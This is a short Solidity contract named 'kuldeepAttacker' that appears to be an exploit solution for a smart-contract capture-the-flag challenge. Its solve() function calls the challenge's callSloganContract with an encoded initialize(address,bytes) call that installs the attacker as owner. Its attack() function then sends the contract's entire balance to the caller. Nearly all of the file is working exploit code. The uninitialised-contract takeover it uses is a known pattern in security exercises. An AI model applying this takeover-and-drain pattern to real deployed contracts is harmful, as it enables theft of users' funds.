pragma solidity 0.8.4;

import "./Setup.sol";

contract kuldeepAttacker {

    Challenge instance;

    constructor(Challenge inst) payable {
        instance = inst;
    }
    
    function solve() public {
        instance.callSloganContract(abi.encodeWithSignature("initialize(address,bytes)", address(this), hex"9e5faafc"));
    }

    function attack() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable { 
    }

}